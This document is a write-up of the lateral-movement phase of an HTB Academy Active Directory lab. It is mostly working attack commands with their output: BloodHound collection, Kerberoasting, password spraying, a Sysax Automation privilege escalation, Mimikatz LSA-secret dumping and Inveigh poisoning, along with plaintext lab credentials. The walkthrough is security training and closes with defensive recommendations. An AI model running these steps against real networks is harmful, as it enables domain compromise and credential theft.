# Lateral Movement

## 🎯 Overview

**Lateral Movement** leverages **domain credentials** for **Active Directory enumeration**, **share hunting**, **Kerberoasting**, and **privilege escalation** across multiple hosts. Use **BloodHound** for attack path discovery, **file share analysis** for credential hunting, and **post-exploitation techniques** for comprehensive domain compromise.

## 🩸 BloodHound AD Enumeration

### 🔍 Data Collection
```bash
# SharpHound execution (from SYSTEM shell on DEV01)
SharpHound.exe -c All

# Collection methods enabled:
Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

# Results:
2022-06-22T10:03:18 [*] Enumeration finished in 00:00:46
[*] Status: 3641 objects finished
[*] SharpHound Enumeration Completed! Happy Graphing!
```

### 🎯 Attack Path Analysis
```cmd
# hporter account analysis:
- ForceChangePassword rights over ssmalls user
- Domain Users group membership
- Limited direct privileges

# ssmalls account capabilities:
- Standard domain user access
- Department Shares read access
- SYSVOL share access (all domain users)

# Key finding: Domain Users → RDP access to DEV01
Risk: Medium (Excessive Active Directory Group Privileges)
```

## 📁 File Share Hunting

### 🔍 Share Discovery & Enumeration
```bash
# Initial share enumeration (hporter)
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
# Result: Limited access, basic shares only

# Enhanced enumeration (ssmalls)
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M spider_plus --share 'Department Shares'

# Discovered shares:
\\DC01.INLANEFREIGHT.LOCAL\Department Shares (accessible)
\\DC01.INLANEFREIGHT.LOCAL\SYSVOL (domain users access)
```

### 💾 Credential Discovery in Shares
```bash
# Department Shares analysis:
/IT/Private/Development/SQL Express Backup.ps1

# File content analysis:
$mySrvConn.Login = "backupadm"
$mySrvConn.Password = "[REDACTED_PASSWORD]"
# Discovered: backupadm:[PASSWORD] (SQL backup service account)

# SYSVOL share enumeration:
\\172.16.8.3\sysvol\INLANEFREIGHT.LOCAL\scripts\adum.vbs

# Legacy credentials found:
Const cdoUserName = "account@inlanefreight.local"
Const cdoPassword = "L337^p@$$w0rD"
# Assessment: Likely outdated (2011/2015 script dates)
```

## 🎫 Kerberoasting Attack

### 🔍 SPN Account Discovery
```powershell
# PowerView SPN enumeration
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Select samaccountname

# Discovered SPN accounts:
azureconnect, backupjob, krbtgt, mssqlsvc, sqltest, sqlqa, sqldev, mssqladm, svc_sql, sqlprod, sapsso, sapvc, vmwarescvc

# Ticket extraction
Get-DomainUser * -SPN -verbose | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_spns.csv -NoTypeInformation
```

### 🔐 Hash Cracking Results
```bash
# Hashcat attack
hashcat -m 13100 ilfreight_spns /usr/share/wordlists/rockyou.txt

# Successful crack:
backupjob:[CRACKED_PASSWORD]

# BloodHound analysis:
- Account has limited privileges
- No direct administrative access
- Document as finding: Weak Kerberos Authentication Configuration
```

## 🌊 Password Spraying Campaign

### 💥 Domain-Wide Password Attack
```powershell
# DomainPasswordSpray execution
Invoke-DomainPasswordSpray -Password Welcome1

# Results:
[*] Password spraying against 2913 accounts
[*] SUCCESS! User:kdenunez Password:Welcome1
[*] SUCCESS! User:mmertle Password:Welcome1

# Assessment:
- 2 successful authentications
- Accounts have standard user privileges
- Document as finding: Weak Active Directory Passwords
```

### 🔍 Additional Enumeration Techniques
```bash
# GPP autologin search
proxychains crackmapexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
# Result: No Registry.xml files found

# AD user description analysis
Get-DomainUser * | select samaccountname,description | ?{$_.Description -ne $null}
# Found: frontdesk - "ILFreightLobby!" (limited privileges)
# Document as finding: Passwords in AD User Description Field
```

## 🖥️ MS01 Host Compromise

### 🔑 WinRM Access Discovery
```bash
# WinRM port enumeration
proxychains nmap -sT -p 5985 172.16.8.50
# Result: 5985/tcp open wsman

# Authentication with backupadm
proxychains evil-winrm -i 172.16.8.50 -u backupadm
# Success: Remote shell access to ACADEMY-AEN-MS01
```

### 🔺 Local Privilege Escalation
```bash
# Standard privilege checks
whoami /priv
# Result: No useful privileges

# Unattend.xml credential discovery
type c:\panther\unattend.xml
# Found AutoLogon credentials:
<Username>ilfserveradm</Username>
<Password><Value>Sys26Admin</Value></Password>

# User verification
net user ilfserveradm
# Result: Remote Desktop Users membership (non-admin)
```

### 🛠️ Sysax Automation Privilege Escalation
```cmd
# Vulnerable software discovery:
C:\Program Files (x86)\SysaxAutomation\

# Exploitation steps:
1. Create pwn.bat: "net localgroup administrators ilfserveradm /add"
2. Open sysaxschedscp.exe
3. Setup Scheduled/Triggered Tasks → Add task (Triggered)
4. Monitor folder: C:\Users\ilfserveradm\Documents
5. Run program: C:\Users\ilfserveradm\Documents\pwn.bat
6. Uncheck "Login as the following user" (runs as SYSTEM)
7. Create trigger file in monitored directory

# Result: ilfserveradm added to Administrators group
```

### 💎 Post-Exploitation Credential Harvesting
```bash
# Mimikatz execution (as local admin)
mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets

# LSA Secrets discovered:
Secret: DefaultPassword
cur/text: DBAilfreight1!

# Registry query for username
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
# Result: DefaultUserName : mssqladm

# Final credential pair:
mssqladm:DBAilfreight1!
```

## 🕷️ Network Credential Harvesting

### 🎣 Inveigh LLMNR/NBT-NS Poisoning
```powershell
# Inveigh execution (as local admin)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

# Configuration:
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.8.50
[+] LLMNR Spoofer = Enabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled

# Captured credentials:
[+] SMB(445) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from 172.16.8.20
# Hash format: NTLMv2 (suitable for offline cracking)
```

### 📊 Additional Intelligence Gathering
```bash
# Interesting files discovered:
c:\budget_data.xlsx          # Potential sensitive data
c:\Inlanefreight.kdbx       # KeePass database file

# Browser credential hunting:
lazagne.exe browsers -firefox
# Result: No stored credentials found

# Assessment notes:
- Files in unusual locations (security concern)
- KeePass database (potential password vault)
- Development environment artifacts
```

## 🎯 Credential Summary

### 🔐 Compromised Accounts Inventory
```cmd
# Domain accounts:
hporter:Gr8hambino!           # Initial domain foothold
ssmalls:Str0ngpass86!         # Password changed via ForceChangePassword
kdenunez:Welcome1             # Password spraying result
mmertle:Welcome1              # Password spraying result
mssqladm:DBAilfreight1!       # LSA Secrets from MS01

# Local accounts:
Administrator (DEV01):NT_HASH  # SAM database extraction
mpalledorous (DEV01):NT_HASH   # SAM database extraction
ilfserveradm (MS01):Sys26Admin # Unattend.xml discovery

# Legacy/Historical:
account:L337^p@$$w0rD          # SYSVOL script (outdated)
frontdesk:ILFreightLobby!      # AD description field
backupjob:[PASSWORD]           # Kerberoasting result
```

### 🎯 Access Matrix
```cmd
# Host access capabilities:
DEV01 (172.16.8.20):
- SYSTEM access (PrintSpoofer)
- Domain joined (AD enumeration)
- RDP access (all Domain Users)

MS01 (172.16.8.50):
- Local admin access (Sysax exploit)
- WinRM connectivity
- Network position for poisoning attacks

DMZ01 (172.16.8.120):
- Root access (SSH key)
- Pivot infrastructure
- Network monitoring capability
```

## 🔍 Attack Path Progression

### 📊 Lateral Movement Chain
```cmd
# Phase 1: Initial domain access
hporter:Gr8hambino! → Domain Users privileges

# Phase 2: Privilege escalation
ForceChangePassword → ssmalls account control

# Phase 3: Share enumeration
Department Shares → SQL backup script → backupadm credentials

# Phase 4: Host compromise
WinRM access → MS01 foothold → Local admin escalation

# Phase 5: Credential harvesting
Unattend.xml → AutoLogon → mssqladm discovery
```

### 🎯 Next Phase Preparation
```cmd
# Available attack vectors:
1. mssqladm account exploitation (SQL Server access)
2. Network poisoning attacks (Inveigh results)
3. Additional host enumeration (172.16.8.50 fully compromised)
4. KeePass database analysis (if accessible)
5. Domain controller attack preparation

# Privilege escalation targets:
- SQL Server service account privileges
- Cached credential analysis
- Additional unattend.xml files
- Service account hunting
```

## 🎯 HTB Academy Lab Context

### 📋 Techniques Demonstrated
```cmd
# Active Directory enumeration:
- BloodHound data collection and analysis
- PowerView privilege enumeration
- Share hunting with CrackMapExec
- SPN account discovery and Kerberoasting

# Lateral movement methods:
- ForceChangePassword privilege abuse
- WinRM service exploitation
- RDP access with drive redirection
- Local privilege escalation techniques

# Credential discovery sources:
- File share configuration files
- Registry autologon settings
- LSA Secrets extraction
- Network traffic poisoning
```

### 🔍 Professional Methodology
```cmd
# Systematic approach:
- Complete domain enumeration before moving
- Document all discovered credentials
- Test multiple attack vectors simultaneously
- Maintain operational security during changes

# Evidence collection:
- Screenshot all successful authentications
- Save all discovered configuration files
- Document privilege escalation steps
- Track network access changes
```

## 🛡️ Defensive Recommendations

### 🔒 Active Directory Security
```cmd
# Account management:
- Implement least privilege principles
- Regular password policy enforcement
- Monitor ForceChangePassword privileges
- Audit service account permissions

# File share security:
- Restrict Department Shares access
- Remove credentials from configuration files
- Implement proper NTFS permissions
- Regular share permission audits

# Network security:
- Disable LLMNR/NBT-NS if not needed
- Implement network segmentation
- Monitor for lateral movement patterns
- Deploy endpoint detection and response
``` 